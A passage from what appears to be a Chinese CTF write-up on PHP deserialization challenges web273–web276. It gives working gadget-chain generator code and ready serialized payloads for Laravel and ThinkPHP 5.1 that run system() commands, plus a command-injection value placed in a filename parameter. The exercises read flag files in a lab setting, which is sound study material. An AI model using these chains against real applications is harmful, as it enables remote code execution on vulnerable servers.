variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">QueuedCommand</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">,</span> <span class="token variable">$event</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token variable">$events</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">PhpParser<span class="token punctuation">\</span>Node<span class="token punctuation">\</span>Scalar<span class="token punctuation">\</span>MagicConst<span class="token punctuation">\</span>Line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mockdefinition</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php system('cat /f*');exit;?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$evalloader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dispatcher</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$evalloader</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$queuedcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console<span class="token punctuation">\</span>QueuedCommand</span><span class="token punctuation">(</span><span class="token variable">$mockdefinition</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingbroadcast</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$dispatcher</span><span class="token punctuation">,</span><span class="token variable">$queuedcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingbroadcast</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ÊàñËÄÖ‰ΩøÁî®phpgcc</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> data<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A29<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CSupport<span class="token operator">%</span><span class="token number">5</span>CMessageBag<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>messages<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>format<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A40<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBroadcasting<span class="token operator">%</span><span class="token number">5</span>CPendingBroadcast<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>events<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBus<span class="token operator">%</span><span class="token number">5</span>CDispatcher<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A16<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>queueResolver<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CLoader<span class="token operator">%</span><span class="token number">5</span>CEvalLoader<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">7</span>Di<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>load<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>event<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A38<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBroadcasting<span class="token operator">%</span><span class="token number">5</span>CBroadcastEvent<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>connection<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A32<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CGenerator<span class="token operator">%</span><span class="token number">5</span>CMockDefinition<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>config<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CGenerator<span class="token operator">%</span><span class="token number">5</span>CMockConfiguration<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>abcdefg<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">%</span><span class="token number">20</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fflag<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>exit<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web274-Thinkphp5-1ÂèçÂ∫èÂàóÂåñÊºèÊ¥û"><a href="#web274-Thinkphp5-1ÂèçÂ∫èÂàóÂåñÊºèÊ¥û" class="headerlink" title="web274(Thinkphp5.1ÂèçÂ∫èÂàóÂåñÊºèÊ¥û)"></a>web274(Thinkphp5.1ÂèçÂ∫èÂàóÂåñÊºèÊ¥û)</h4><p><a href="https://blog.csdn.net/rfrder/article/details/113843768">Thinkphp5.1 ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂ§çÁé∞</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"lin"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"lin"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span> <span class="token comment">//PHPÂáΩÊï∞</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment">// Ë°®Âçïajax‰º™Ë£ÖÂèòÈáè</span>        <span class="token string single-quoted-string">'var_ajax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_ajax'</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"var_ajax"</span><span class="token operator">=></span><span class="token string single-quoted-string">'lin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//PHPÂáΩÊï∞ÁöÑÂèÇÊï∞</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">?</span>lin<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span class="token operator">&amp;</span>data<span class="token operator">=</span>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</code></pre><h4 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>Ê≤°‰ªîÁªÜÁúã‰∏ãÈù¢ÁöÑÔºåÁúãÂà∞‰∫Ü<code>__destruct</code>ÂèØ‰ª•Ë∞ÉÁî®<code>system</code>ÊâÄ‰ª•Âè™ÈúÄË¶ÅÊª°Ë∂≥checkevilÁöÑÊ≠£ÂàôÂåπÈÖçÔºåÊâßË°å<code>system</code>Âç≥ÂèØ</p><p>Payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token keyword">fn</span><span class="token operator">=</span><span class="token operator">|</span><span class="token class-name">tac</span> fla<span class="token operator">*</span><span class="token constant">POST</span><span class="token punctuation">:</span> flag</code></pre><h4 id="web276-PharÂèçÂ∫èÂàóÂåñ"><a href="#web276-PharÂèçÂ∫èÂàóÂåñ" class="headerlink" title="web276(PharÂèçÂ∫èÂàóÂåñ)"></a>web276(PharÂèçÂ∫èÂàóÂåñ)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token 